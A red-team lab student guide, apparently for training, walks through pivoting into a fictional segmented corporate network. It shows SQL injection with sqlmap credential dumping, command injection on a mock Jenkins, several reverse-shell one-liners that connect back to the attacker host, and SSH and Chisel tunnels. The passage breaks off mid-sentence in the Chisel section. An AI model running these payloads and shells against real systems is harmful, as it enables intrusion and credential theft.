{
  "title": "Red Team Training Lab v3 - Advanced Pivoting",
  "content_type": "student_guide",
  "body_markdown": "# Red Team Training Lab v3 - Advanced Pivoting\n\nWelcome to the most comprehensive lab in this series. You will learn how real-world penetration testers break into segmented corporate networks by **pivoting** -- hopping from one compromised machine to the next until you reach the most sensitive systems.\n\nThis walkthrough is written so that anyone with basic computer skills can follow it from start to finish. Every command is explained. Every expected output is shown. If you get stuck, look for the **Stuck?** sections at the end of each phase.\n\n---\n\n## Lab Overview and Mission Briefing\n\n### The Scenario\n\nYou have been hired as an authorized penetration tester by **Acme Widgets Corporation**. The company wants to know: can an attacker on the internet reach their most sensitive internal systems?\n\nYour job is to find out -- legally and ethically -- by simulating a real attack.\n\n### What You Will Learn\n\nBy the end of this lab you will be able to:\n\n- Scan networks to discover hosts and services\n- Exploit SQL injection vulnerabilities to steal credentials\n- Exploit command injection to get remote shell access\n- Set up network pivots using three different tools (SSH tunnels, Chisel, and Ligolo-ng)\n- Route your traffic through compromised machines using proxychains\n- Enumerate internal services (wikis, ticketing systems, databases, file shares)\n- Compromise an Active Directory domain\n- Understand how defenders should prevent each attack\n\n### Your Starting Position\n\nYou are sitting at a **Kali Linux** workstation on the \"internet\" network segment. Think of this like being at a coffee shop across the street from Acme Widgets' office. You can see their front door (public-facing services), but you cannot walk directly into their back office (internal network).\n\n### Network Architecture\n\nThe network has **three segments** separated by a firewall, just like a real corporate network:\n\n```\n===================================================================================\n  INTERNET (172.16.0.0/24)       DMZ (172.16.1.0/24)        INTERNAL (172.16.2.0/24)\n  You start here                 Public-facing services      The target\n  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500          \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500       \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  kali        (172.16.0.10)      webserver  (172.16.1.10)    fileserver (172.16.2.10)\n  firewall    (172.16.0.1)       jumpbox    (172.16.1.20)    ws01       (172.16.2.11)\n  vpn         (172.16.0.50)      ftp        (172.16.1.30)    dc01       (172.16.2.12)\n                                 jenkins    (172.16.1.40)    wiki       (172.16.2.20)\n                                                             ticketing  (172.16.2.30)\n                                                             db01       (172.16.2.40)\n===================================================================================\n```\n\n**What is a DMZ?** DMZ stands for \"Demilitarized Zone.\" In networking, it is a buffer zone between the public internet and the private internal network. Companies put their public-facing servers (websites, email, etc.) in the DMZ so that if one of those servers gets hacked, the attacker still cannot directly reach the internal network. Think of it like a lobby in a secure building -- visitors can enter the lobby, but they need a badge to get past the second set of doors.\n\n### Firewall Rules (What Traffic is Allowed)\n\nThe firewall uses **NAT** (Network Address Translation) to expose certain DMZ services to the internet:\n\n| What You Can Reach From Kali | Where It Actually Goes | Service |\n|------------------------------|------------------------|---------|\n| 172.16.0.100 port 80 | 172.16.1.10 port 80 | WordPress website |\n| 172.16.0.100 port 443 | 172.16.1.10 port 443 | WordPress HTTPS |\n| 172.16.0.100 port 8080 | 172.16.1.40 port 8080 | Jenkins CI/CD dashboard |\n\nThe firewall also allows these specific flows between segments:\n\n- **Webserver** can talk to **db01** on port 3306 (MySQL) -- because the website needs its database\n- **Jenkins** can talk to **fileserver** on port 445 (SMB) -- because CI/CD needs to deploy files\n- **Jumpbox** can SSH to any **internal** host on port 22 -- because admins need a way in\n- Webserver has SSH (port 22) reachable from the internet\n\n### Multiple Attack Paths\n\nThis lab has several ways to reach the goal. The primary path we will follow is:\n\n1. SQL Injection on WordPress to steal credentials\n2. SSH into the webserver using stolen credentials\n3. Pivot through the webserver to reach internal systems\n4. Enumerate internal services to find Domain Admin credentials\n5. Compromise the domain controller\n\nBut there are alternative paths too -- Jenkins command injection, VPN access, and the jumpbox route. We will cover all of them.\n\n### What Success Looks Like\n\nYour mission is complete when you can authenticate as **Domain Administrator** on the domain controller (dc01 at 172.16.2.12) for the ACMEWIDGETS.LOCAL domain.\n\n---\n\n## Phase 1: Reconnaissance\n\n### Educational Introduction -- What is Reconnaissance?\n\nReconnaissance (\"recon\") is the first phase of any penetration test. It means gathering information about your target before you attack.\n\n**Real-world analogy:** Before a burglar robs a house, they drive by to see where the doors and windows are, what kind of locks they have, whether there are security cameras, and when people are home. Network reconnaissance is the digital version of this.\n\n**Why it works:** Every service running on a network is a potential entry point. The more you know about what is running, the better your chances of finding a weakness.\n\n**How defenders prevent it:** Firewalls, intrusion detection systems (IDS), and minimizing exposed services. You cannot hack what you cannot see.\n\n### Objective\n\nDiscover all reachable hosts and services from your position on the internet segment.\n\n### Step 1: Verify Your Own Position\n\nFirst, confirm your IP address and which network you are on.\n\n```bash\nip addr show eth0\n```\n\n**Expected output:**\n```\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...\n    inet 172.16.0.10/24 brd 172.16.0.255 scope global eth0\n```\n\nYou are at `172.16.0.10` on the `172.16.0.0/24` network. Good -- that is the internet segment.\n\n### Step 2: Discover Live Hosts on Your Network\n\nUse nmap to do a **ping sweep** -- this sends a small packet to every IP address in the range and sees who responds.\n\n```bash\nnmap -sn 172.16.0.0/24\n```\n\n**What the flag means:**\n- `-sn` = \"ping scan\" -- just check if hosts are alive, do not scan their ports yet. This is fast and relatively quiet.\n\n**Expected output:**\n```\nStarting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 172.16.0.1\nHost is up (0.0010s latency).\nNmap scan report for 172.16.0.10\nHost is up (0.0001s latency).\nNmap scan report for 172.16.0.50\nHost is up (0.0015s latency).\nNmap scan report for 172.16.0.100\nHost is up (0.0012s latency).\nNmap done: 256 IP addresses (4 hosts up) scanned in 2.35 seconds\n```\n\n**What we found:**\n| IP Address | What It Is |\n|------------|------------|\n| 172.16.0.1 | Firewall (gateway for this network) |\n| 172.16.0.10 | Our Kali machine (that is us) |\n| 172.16.0.50 | VPN server |\n| 172.16.0.100 | NAT address (firewall forwards traffic here to DMZ services) |\n\n### Step 3: Scan the NAT Address for Open Ports\n\nNow let us find out what services are exposed through the firewall's NAT.\n\n```bash\nnmap -sV -sC -p- 172.16.0.100\n```\n\n**What the flags mean:**\n- `-sV` = Version detection. Nmap will try to figure out what software is running on each open port and what version it is.\n- `-sC` = Default scripts. Nmap will run its standard set of scripts to gather extra information (like website titles, SSH key fingerprints, etc.).\n- `-p-` = Scan ALL 65,535 ports, not just the common ones. This takes longer but makes sure we do not miss anything.\n\n**Note:** A full `-p-` scan can take several minutes. If you want faster results first, try scanning just common ports:\n\n```bash\nnmap -sV -sC 172.16.0.100\n```\n\n**Expected output (abbreviated):**\n```\nStarting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 172.16.0.100\nHost is up (0.0012s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1\n80/tcp   open  http    Apache httpd 2.4.52\n|_http-title: Acme Widgets - Employee Portal\n443/tcp  open  ssl/http Apache httpd 2.4.52\n8080/tcp open  http    Werkzeug httpd 3.1.5 (Python 3.12.12)\n|_http-title: ACME CI/CD - Login\n```\n\n**What we found:**\n| Port | Service | What It Means |\n|------|---------|---------------|\n| 22 | SSH (OpenSSH) | Remote login service -- if we get credentials, we can log in |\n| 80 | HTTP (Apache) | A website -- WordPress employee portal |\n| 443 | HTTPS (Apache) | Same website but encrypted |\n| 8080 | HTTP (Werkzeug/Python) | A Python web application -- the Jenkins CI/CD dashboard |\n\n### Step 4: Scan the VPN Server\n\nLet us also check the VPN server:\n\n```bash\nnmap -sV -sU -p 1194 172.16.0.50\n```\n\n**What the flags mean:**\n- `-sU` = UDP scan. VPN protocols often use UDP instead of TCP.\n- `-p 1194` = Only scan port 1194 (the standard OpenVPN port).\n\n**Expected output:**\n```\nPORT     STATE SERVICE VERSION\n1194/udp open  openvpn OpenVPN\n```\n\n### Step 5: Web Application Reconnaissance\n\nLet us take a closer look at the two web applications we found.\n\n**Check the WordPress site:**\n\n```bash\ncurl -s http://172.16.0.100 | head -30\n```\n\n**What this does:** `curl` fetches the webpage. `-s` means \"silent\" (no progress bar). We pipe it to `head -30` to see just the first 30 lines.\n\n**Check the Jenkins dashboard:**\n\n```bash\ncurl -s http://172.16.0.100:8080 | head -30\n```\n\nYou should see an HTML login page for the CI/CD dashboard.\n\n**Directory enumeration on WordPress:**\n\n```bash\ngobuster dir -u http://172.16.0.100 -w /usr/share/wordlists/dirb/common.txt\n```\n\n**What this does:** Gobuster tries thousands of common directory names against the website to find hidden pages.\n- `dir` = directory brute-force mode\n- `-u` = the target URL\n- `-w` = the wordlist file to use\n\n**Expected output (key findings):**\n```\n/employees            (Status: 301) [Size: 0] [--> /employees/]\n/wp-admin             (Status: 301) [Size: 0] [--> /wp-admin/]\n/wp-content           (Status: 301) [Size: 0] [--> /wp-content/]\n/wp-includes          (Status: 301) [Size: 0] [--> /wp-includes/]\n```\n\nThe `/employees/` directory is very interesting -- that is not a standard WordPress path. Let us investigate.\n\n```bash\ncurl -s http://172.16.0.100/employees/ | head -50\n```\n\nYou should see an Employee Directory page with a list of employees and a search box.\n\n### What We Learned\n\n- There are 4 reachable hosts on the internet segment\n- The firewall NAT exposes SSH, HTTP, HTTPS, and a CI/CD dashboard\n- There is a WordPress site with an employee directory\n- There is a Jenkins-style CI/CD dashboard running Python (Werkzeug)\n- There is a VPN server\n\n### Stuck?\n\n- If nmap is not finding hosts, make sure you are using the right subnet: `172.16.0.0/24`\n- If curl shows nothing, try opening Firefox and navigating to `http://172.16.0.100` directly\n- If gobuster fails, check that the wordlist exists: `ls /usr/share/wordlists/dirb/common.txt`\n\n---\n\n## Phase 2: SQL Injection -- Stealing Credentials\n\n### Educational Introduction -- What is SQL Injection?\n\nSQL Injection (SQLi) is one of the oldest and most dangerous web application vulnerabilities. It has been in the OWASP Top 10 list of critical security risks for over two decades.\n\n**What it is in plain English:** When a website takes your input (like a search term or ID number) and plugs it directly into a database query without checking it first, you can trick the database into running commands it was never supposed to run.\n\n**Analogy:** Imagine a librarian who will fetch any book you ask for by writing your request on a slip of paper and handing it to a helper. If you write \"Book #5\" the helper fetches book #5. But what if you write \"Book #5, and also give me the entire filing cabinet of passwords\"? If the librarian does not check what you wrote before passing it along, the helper will do both things. That is SQL injection.\n\n**Why it works:** Programmers sometimes build database queries by gluing user input directly into the query string. When they do this, the database cannot tell the difference between the query and the attacker's injected commands.\n\n**How it is used in real-world attacks:**\n- In 2017, Equifax was breached through a web vulnerability, exposing 147 million people's personal data\n- SQL injection is used to steal credit card numbers, passwords, personal information, and trade secrets\n- It is often the first step in a larger attack chain (exactly like in this lab)\n\n**How to defend against it:**\n- **Parameterized queries** (also called prepared statements) -- these keep user input separate from the SQL command\n- **Input validation** -- reject input that contains SQL special characters\n- **Web Application Firewalls (WAFs)** -- filter out known attack patterns\n- **Least privilege** -- database accounts should only have the permissions they need\n\n### Objective\n\nFind and exploit the SQL injection vulnerability in the WordPress employee directory to extract employee credentials.\n\n### Step 1: Find the Vulnerable Parameter\n\nBrowse to the employee directory and click on an employee name:\n\n```bash\ncurl -s \"http://172.16.0.100/employees/?employee_id=1\"\n```\n\nYou should see details for employee #1. Notice the URL contains `employee_id=1` -- this is user-controllable input being sent to the database.\n\n### Step 2: Test for SQL Injection (Manual Method)\n\nWe will use **boolean-based testing**. The idea is simple: inject something that is always TRUE and something that is always FALSE. If the page behaves differently, the input is being executed as SQL.\n\n**Test 1 -- Normal request (baseline):**\n\n```bash\ncurl -s \"http://172.16.0.100/employees/?employee_id=1\" | grep -o 'Notes:</strong>[^<]*'\n```\n\n**Expected output:**\n```\nNotes:</strong> IT admin, has server access\n```\n\n**Test 2 -- Inject AND 1=1 (always TRUE -- should show same result):**\n\n```bash\ncurl -s \"http://172.16.0.100/employees/?employee_id=1%20AND%201=1\" | grep -o 'Notes:</strong>[^<]*'\n```\n\n**What `%20` means:** It is the URL encoding for a space character. The actual SQL being sent is `1 AND 1=1`.\n\n**Expected output:**\n```\nNotes:</strong> IT admin, has server access\n```\n\nSame result as before -- because `1 AND TRUE` is still `1`.\n\n**Test 3 -- Inject AND 1=2 (always FALSE -- should show nothing):**\n\n```bash\ncurl -s \"http://172.16.0.100/employees/?employee_id=1%20AND%201=2\" | grep -o 'Notes:</strong>[^<]*'\n```\n\n**Expected output:** (empty -- no output at all)\n\nThe page returned no data because the query became `WHERE employee_id = 1 AND 1=2`, and since `1=2` is false, the whole condition is false, so no rows are returned.\n\n**Conclusion:** Different responses to TRUE vs FALSE conditions confirm SQL injection. The database is executing our injected SQL.\n\n### Step 3: Extract Data Using UNION-Based Injection (Manual Method)\n\nFor students who want to understand the mechanics, here is how to manually extract data.\n\n**First, figure out how many columns the original query returns:**\n\n```bash\n# Try ORDER BY 1 (should work)\ncurl -s \"http://172.16.0.100/employees/?employee_id=1%20ORDER%20BY%201\" | grep -o 'Notes:</strong>[^<]*'\n\n# Try ORDER BY 5 (should work)\ncurl -s \"http://172.16.0.100/employees/?employee_id=1%20ORDER%20BY%205\" | grep -o 'Notes:</strong>[^<]*'\n\n# Try ORDER BY 10 (might fail -- too many columns)\ncurl -s \"http://172.16.0.100/employees/?employee_id=1%20ORDER%20BY%2010\" | grep -o 'Notes:</strong>[^<]*'\n```\n\nKeep increasing the number until the page breaks. The last number that works tells you how many columns are in the query.\n\n**Then use UNION SELECT to inject your own query:**\n\n```bash\n# Example: extract database version (adjust column count to match)\ncurl -s \"http://172.16.0.100/employees/?employee_id=-1%20UNION%20SELECT%201,version(),3,4,5,6\"\n```\n\nNote: We use `employee_id=-1` so the first query returns nothing, and only our injected UNION SELECT data is displayed.\n\n### Step 4: Extract Data Using SQLMap (Automated Method -- Recommended)\n\nSQLMap is a powerful tool that automates SQL injection exploitation. This is what professionals use.\n\n**Step 4a: Confirm the vulnerability:**\n\n```bash\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" -p employee_id --batch\n```\n\n**What the flags mean:**\n- `-u` = the target URL with the parameter to test\n- `-p employee_id` = specifically test the `employee_id` parameter\n- `--batch` = answer all prompts with default values (non-interactive mode)\n\n**Expected output (abbreviated):**\n```\n[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[INFO] GET parameter 'employee_id' appears to be 'AND boolean-based blind' injectable\n...\n[INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL >= 5.0\n```\n\nSQLMap confirmed the vulnerability and identified the database as MySQL.\n\n**Step 4b: List all databases:**\n\n```bash\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" -p employee_id --dbs --batch\n```\n\n**What `--dbs` means:** List all databases on the server.\n\n**Expected output:**\n```\navailable databases [2]:\n[*] information_schema\n[*] wordpress\n```\n\n**Step 4c: List tables in the WordPress database:**\n\n```bash\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" -p employee_id -D wordpress --tables --batch\n```\n\n**What the flags mean:**\n- `-D wordpress` = target the `wordpress` database\n- `--tables` = list all tables\n\n**Expected output:**\n```\nDatabase: wordpress\n[several tables]\n...\n| wp_acme_employees |\n...\n```\n\nThe `wp_acme_employees` table looks like it contains employee data.\n\n**Step 4d: Dump the employee table:**\n\n```bash\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" -p employee_id -D wordpress -T wp_acme_employees --dump --batch\n```\n\n**What `--dump` means:** Extract all rows from the specified table.\n\n**Expected output:**\n```\nDatabase: wordpress\nTable: wp_acme_employees\n[3 entries]\n+----+-----------+----------+------------+----------------+----------------------------------+\n| id | username  | password | first_name | last_name      | notes                            |\n+----+-----------+----------+------------+----------------+----------------------------------+\n| 1  | jsmith    | Summer2024   | John   | Smith          | IT admin, has server access       |\n| 2  | mwilliams | Welcome123   | Mary   | Williams       | New hire, started Jan 2024        |\n| 3  | svc_backup| Backup2024   | Backup | Service Account| Automated backup service          |\n+----+-----------+----------+------------+----------------+----------------------------------+\n```\n\n### Critical Findings\n\nWe extracted **three sets of credentials** from the database:\n\n| Username | Password | Notes |\n|----------|----------|-------|\n| jsmith | Summer2024 | IT admin with server access |\n| mwilliams | Welcome123 | New employee |\n| svc_backup | Backup2024 | Service account for backups |\n\nThese passwords are stored in **plaintext** -- a major security violation. In a properly secured application, passwords would be hashed (scrambled) so that even if the database is breached, attackers cannot read them directly.\n\n### Step 5: Test the Credentials on SSH\n\nWe found that port 22 (SSH) is open on 172.16.0.100. Let us try logging in with the stolen credentials:\n\n```bash\nssh svc_backup@172.16.0.100\n```\n\nWhen prompted for the password, type: `Backup2024`\n\n**Expected result:** You should get a shell on the webserver!\n\n```\nsvc_backup@webserver:~$\n```\n\nCheck where you are:\n\n```bash\nhostname\nip addr show\n```\n\n**Expected output:**\n```\nwebserver\n...\ninet 172.16.1.10/24 ...\n```\n\nYou are now on the **webserver** at `172.16.1.10` -- that is in the DMZ. You have crossed the first boundary.\n\nType `exit` to close this SSH session for now. We will set up a proper pivot next.\n\nAlternatively, test the other account that has sudo access:\n\n```bash\nssh admin@172.16.0.100\n```\n\nPassword: `Acme2024!`\n\nThis account has `sudo` privileges, which gives you full control of the webserver.\n\n### What We Learned\n\n- The employee directory has a SQL injection vulnerability in the `employee_id` parameter\n- We extracted three sets of credentials from the database\n- The `svc_backup` password works for SSH on the webserver\n- We now have a foothold in the DMZ\n\n### Stuck?\n\n- If SQLMap does not find the injection, make sure the URL is exactly: `http://172.16.0.100/employees/?employee_id=1`\n- If SSH fails, double-check you are connecting to `172.16.0.100` (the NAT address), not `172.16.1.10` (the internal DMZ address you cannot reach yet)\n- If password authentication fails, check for typos: `Backup2024` (capital B)\n\n---\n\n## Phase 3: Jenkins Command Injection -- An Alternative Entry Point\n\n### Educational Introduction -- What is Remote Code Execution (RCE)?\n\nRemote Code Execution means an attacker can run commands on a server from across the network, as if they were sitting at the keyboard.\n\n**What it is in plain English:** Imagine you could call a restaurant and instead of just ordering food, you could tell the chef to do anything -- open the back door, hand you the cash register, read you the employee files. That is what RCE lets an attacker do to a server.\n\n**Why it works:** Some applications take user input and pass it directly to the operating system for execution. If the application does not filter out dangerous commands, the attacker can inject whatever they want.\n\n**How it is used in real-world attacks:**\n- In 2021, the Log4Shell vulnerability (CVE-2021-44228) allowed RCE on millions of servers running Java applications\n- CI/CD systems like Jenkins are high-value targets because they often have access to production servers and contain deployment credentials\n- RCE is the \"holy grail\" of web exploitation -- it gives you direct control of the server\n\n**How to defend against it:**\n- **Never pass user input to system commands** (use APIs and libraries instead)\n- **Strong authentication** on admin interfaces (never use default passwords)\n- **Network segmentation** to limit what a compromised CI/CD server can access\n- **Principle of least privilege** -- CI/CD accounts should only have the permissions they need\n\n### Objective\n\nGain a shell on the Jenkins server (172.16.1.40) through its vulnerable script console.\n\n### Important Note About This Jenkins\n\nThis is **not** a real Jenkins instance. It is a Flask (Python) web application that mimics a Jenkins CI/CD dashboard. The key difference: real Jenkins has a Groovy script console, but this application has a **bash command injection** vulnerability. When you type commands into the script console, they are executed directly as bash shell commands via Python's `subprocess.run()` with `shell=True`.\n\n### Step 1: Log Into the Jenkins Dashboard\n\nOpen the Jenkins dashboard in your browser or use curl:\n\n```bash\ncurl -s http://172.16.0.100:8080\n```\n\nYou will see a login page. Try default credentials:\n\n**Username:** `admin`\n**Password:** `admin`\n\nTo log in via curl (to get a session cookie):\n\n```bash\n# Get a session cookie and log in\ncurl -s -c cookies.txt -b cookies.txt http://172.16.0.100:8080/login \\\n  -d \"username=admin&password=admin\" -L | head -30\n```\n\n**What the flags mean:**\n- `-c cookies.txt` = save cookies to a file\n- `-b cookies.txt` = send cookies from the file\n- `-d` implies a POST request (for the login form)\n- `-d` = the form data to send\n- `-L` = follow redirects (after login, the site redirects to the dashboard)\n\nYou should see the CI/CD dashboard HTML, confirming you are logged in.\n\n### Step 2: Test Command Execution\n\nNavigate to the Script Console. This is accessible at `/script-console`.\n\n**Using curl:**\n\n```bash\n# Execute 'id' command to test\ncurl -s -b cookies.txt -X POST http://172.16.0.100:8080/script-console \\\n  -d \"script=id\"\n```\n\n**Expected output (within the HTML):**\n```\nuid=0(root) gid=0(root) groups=0(root)\n```\n\nThe server executed our `id` command and returned the result. Even more concerning: it is running as **root** (the highest-privilege account on Linux).\n\n**Try more commands:**\n\n```bash\n# Check hostname\ncurl -s -b cookies.txt -X POST http://172.16.0.100:8080/script-console \\\n  -d \"script=hostname\"\n\n# Check network interfaces\ncurl -s -b cookies.txt -X POST http://172.16.0.100:8080/script-console \\\n  -d \"script=ip+addr+show\"\n\n# Read /etc/passwd\ncurl -s -b cookies.txt -X POST http://172.16.0.100:8080/script-console \\\n  -d \"script=cat+/etc/passwd\"\n```\n\n**Note:** In the `-d` data, use `+` for spaces in the command, since this is URL-encoded form data.\n\n### Step 3: Get a Reverse Shell\n\nA **reverse shell** is when the target server connects BACK to your machine and gives you an interactive command line. This is the standard way attackers turn command injection into persistent access.\n\n**Analogy:** Imagine you cannot open someone's front door (firewall blocks incoming connections). But you CAN slip them a note that says \"call me.\" When they call you, you now have a two-way conversation. That is a reverse shell -- the victim calls the attacker.\n\n**First, set up a listener on your Kali machine:**\n\nOpen a new terminal tab or window and run:\n\n```bash\nnc -lvnp 4444\n```\n\n**What the flags mean:**\n- `-l` = listen mode (wait for incoming connections)\n- `-v` = verbose (show connection details)\n- `-n` = no DNS resolution (faster)\n- `-p 4444` = listen on port 4444\n\nLeave this running and switch to your other terminal.\n\n#### Reverse Shell Method 1: Bash TCP Redirect\n\nThis is the simplest reverse shell technique. It uses bash's built-in ability to open TCP connections.\n\n```bash\ncurl -s -b cookies.txt -X POST http://172.16.0.100:8080/script-console \\\n  --data-urlencode \"script=bash -i >& /dev/tcp/172.16.0.10/4444 0>&1\"\n```\n\n**What `--data-urlencode` does:** Properly URL-encodes the data, which is important because our command contains special characters like `>`, `&`, and `/`.\n\n**What the reverse shell command does:**\n- `bash -i` = start an interactive bash shell\n- `>& /dev/tcp/172.16.0.10/4444` = redirect all output to a TCP connection to our Kali machine on port 4444\n- `0>&1` = also redirect input from that same connection\n\n**Expected result in your listener terminal:**\n```\nConnection from 172.16.0.100:XXXXX\nroot@jenkins:/#\n```\n\nYou now have a shell on the Jenkins server.\n\n#### Reverse Shell Method 2: Netcat (nc)\n\nIf the bash method does not work, try netcat:\n\n```bash\ncurl -s -b cookies.txt -X POST http://172.16.0.100:8080/script-console \\\n  --data-urlencode \"script=nc 172.16.0.10 4444 -e /bin/bash\"\n```\n\n**Note:** Some versions of netcat do not support `-e`. If this fails, try the next method.\n\n#### Reverse Shell Method 3: Python\n\nPython is almost always available on Linux servers:\n\n```bash\ncurl -s -b cookies.txt -X POST http://172.16.0.100:8080/script-console \\\n  --data-urlencode \"script=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"172.16.0.10\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])'\"\n```\n\n#### Reverse Shell Method 4: Using the Configure Page\n\nThe Jenkins clone also has command injection in the job configuration page at `/configure/<job_name>`.\n\n```bash\ncurl -s -b cookies.txt -X POST http://172.16.0.100:8080/configure/deploy-webapp \\\n  --data-urlencode \"build_command=bash -i >& /dev/tcp/172.16.0.10/4444 0>&1\"\n```\n\nThis endpoint works identically to the script console.\n\n### Step 4: Explore the Jenkins Server\n\nOnce you have a shell (via any method), explore your position:\n\n```bash\nhostname\nip addr show\nwhoami\n```\n\n**Expected output:**\n```\njenkins\n...\ninet 172.16.1.40/24 ...\nroot\n```\n\nYou are on the Jenkins server at `172.16.1.40` in the DMZ, running as root.\n\n**Scan the DMZ from Jenkins:**\n\n```bash\n# Quick ping sweep of the DMZ\nfor i in $(seq 1 50); do ping -c 1 -W 1 172.16.1.$i 2>/dev/null | grep \"bytes from\" & done; wait\n```\n\n**Expected output:**\n```\n64 bytes from 172.16.1.1: icmp_seq=1 ttl=64 time=0.5 ms\n64 bytes from 172.16.1.10: icmp_seq=1 ttl=64 time=0.3 ms\n64 bytes from 172.16.1.20: icmp_seq=1 ttl=64 time=0.4 ms\n64 bytes from 172.16.1.30: icmp_seq=1 ttl=64 time=0.3 ms\n64 bytes from 172.16.1.40: icmp_seq=1 ttl=64 time=0.1 ms\n```\n\n**DMZ hosts discovered:**\n| IP | Host | Role |\n|----|------|------|\n| 172.16.1.1 | Firewall | Gateway |\n| 172.16.1.10 | Webserver | WordPress |\n| 172.16.1.20 | Jumpbox | SSH bastion |\n| 172.16.1.30 | FTP | File server |\n| 172.16.1.40 | Jenkins | This machine |\n\nYou can also try the credentials from the SQLi to SSH into the webserver from Jenkins:\n\n```bash\nssh svc_backup@172.16.1.10\n# Password: Backup2024\n```\n\n### What We Learned\n\n- The Jenkins dashboard uses default admin:admin credentials\n- The script console executes bash commands directly (command injection)\n- We can get a reverse shell using multiple techniques\n- From Jenkins, we can see all other DMZ hosts\n- The Jenkins server runs as root, giving us maximum privileges\n\n### Stuck?\n\n- If the login fails, make sure you are using port 8080: `http://172.16.0.100:8080`\n- If the reverse shell does not connect, make sure your listener is running on port 4444\n- If `--data-urlencode` does not work, try URL-encoding the command manually (replace spaces with `+`, `&` with `%26`, etc.)\n- Remember: this is bash, NOT Groovy. Use regular Linux commands.\n\n---\n\n## Phase 4: Network Pivoting -- Reaching the Internal Network\n\n### Educational Introduction -- What is Network Pivoting?\n\nPivoting is the technique of using a compromised machine as a stepping stone to reach other networks that you cannot access directly.\n\n**What it is in plain English:** You are standing outside a building (the internet). You cannot reach the office on the third floor (internal network) directly. But you managed to get into the lobby (DMZ). From the lobby, you can take the elevator to the third floor. The compromised lobby machine is your \"pivot\" -- you route your traffic through it to reach places you could not reach before.\n\n**Why it works:** Firewalls control traffic between network segments. But once you compromise a machine that is trusted by the firewall (like a webserver that legitimately needs to talk to internal databases), you can piggyback on that trust.\n\n**How it is used in real-world attacks:**\n- APT groups (Advanced Persistent Threats) like APT29 (Cozy Bear) use multi-hop pivots to stay hidden while moving through corporate networks\n- Ransomware groups pivot from an initial phishing victim to domain controllers before deploying ransomware across the whole organization\n- It is a core skill tested in certifications like OSCP, GPEN, and PNPT\n\n**How to defend against it:**\n- **Network segmentation** with strict firewall rules (deny by default)\n- **Zero Trust architecture** -- never assume a device is safe just because it is inside the network\n- **Monitoring east-west traffic** (traffic between internal systems, not just in/out)\n- **Endpoint Detection and Response (EDR)** on all servers to catch suspicious activity\n\n### Objective\n\nEstablish a network pivot through a compromised DMZ host so that tools on your Kali machine can reach the internal network (172.16.2.0/24).\n\nWe will cover **three different pivoting tools**. Try them all to understand the trade-offs.\n\n---\n\n### Pivot Option 1: SSH Dynamic Port Forwarding (SOCKS Proxy)\n\nSSH tunneling is the simplest pivot technique. If you have SSH access to a machine, you can create an encrypted tunnel and route traffic through it.\n\n**How it works:** SSH creates a SOCKS proxy on your local machine. When you send traffic to this proxy, SSH forwards it through the SSH connection to the remote machine, which then sends it to the final destination. The remote machine acts as your relay.\n\n#### Step 1: Create the SSH SOCKS Proxy\n\nFrom your Kali machine:\n\n```bash\nssh -D 9050 -N -f svc_backup@172.16.0.100\n```\n\n**What the flags mean:**\n- `-D 9050` = Create a Dynamic (SOCKS) proxy on local port 9050. Any traffic sent to `localhost:9050` will be forwarded through the SSH tunnel.\n- `-N` = Do not execute a remote command. We just want the tunnel, not an interactive shell.\n- `-f` = Run in the background after authentication.\n\nWhen prompted, enter the password: `Backup2024`\n\n**Verify it is running:**\n\n```bash\nss -tlnp | grep 9050\n```\n\n**Expected output:**\n```\nLISTEN  0  128  127.0.0.1:9050  0.0.0.0:*  users:((\"ssh\",pid=XXXX,fd=X))\n```\n\nThe SOCKS proxy is listening on port 9050.\n\n#### Step 2: Test the Tunnel\n\nNow, the webserver (172.16.1.10) is in the DMZ. From the DMZ, it has firewall rules that allow it to reach the internal database (172.16.2.40) on port 3306. However, the webserver may also be able to reach other internal hosts depending on the firewall configuration.\n\nLet us also create a tunnel through the **jumpbox** if we have credentials, since the jumpbox is explicitly allowed to SSH to any internal host:\n\nBut first, let us test what we can reach through the webserver tunnel. We will configure proxychains in the next phase.\n\n#### SSH Local Port Forwarding (For Specific Services)\n\nIf you only need to reach one specific service, local port forwarding is simpler:\n\n```bash\n# Forward local port 3306 to the internal database through the webserver\nssh -L 3306:172.16.2.40:3306 -N -f svc_backup@172.16.0.100\n```\n\n**What this does:** Any connection to `localhost:3306` on your Kali machine will be forwarded through the SSH tunnel to `172.16.2.40:3306` (the internal MySQL database).\n\n**Test it:**\n\n```bash\nmysql -h 127.0.0.1 -P 3306 -u root -pDBr00t2024!\n```\n\nIf this connects, you just reached an internal database from the internet through your pivot.\n\n#### SSH Remote Port Forwarding (For Receiving Reverse Shells)\n\nIf you need internal machines to connect back to you:\n\n```bash\nssh -R 4444:localhost:4444 -N -f svc_backup@172.16.0.100\n```\n\n**What this does:** Opens port 4444 on the webserver. Any connection to `webserver:4444` will be forwarded back to your Kali machine on port 4444. This is useful for receiving reverse shells from internal machines.\n\n---\n\n### Pivot Option 2: Chisel\n\nChisel is a modern tunneling tool that is faster and more reliable than SSH tunneling for penetration testing. It works as a single binary with no dependencies.\n\n**How it works:** Chisel runs a server on your Kali machine. You upload the chisel binary to the compromised host and run it in client mode, connecting back to your server. This creates a reverse SOCKS proxy -- all your traffic can be routed through the compromised host.\n\n#### Step 1: Start the Chisel Server on Kali\n\n```bash\nchisel server -p 8000 --reverse\n```\n\n**What the flags mean:**\n- `server` = run in server mode\n- `-p 8000` = listen on port 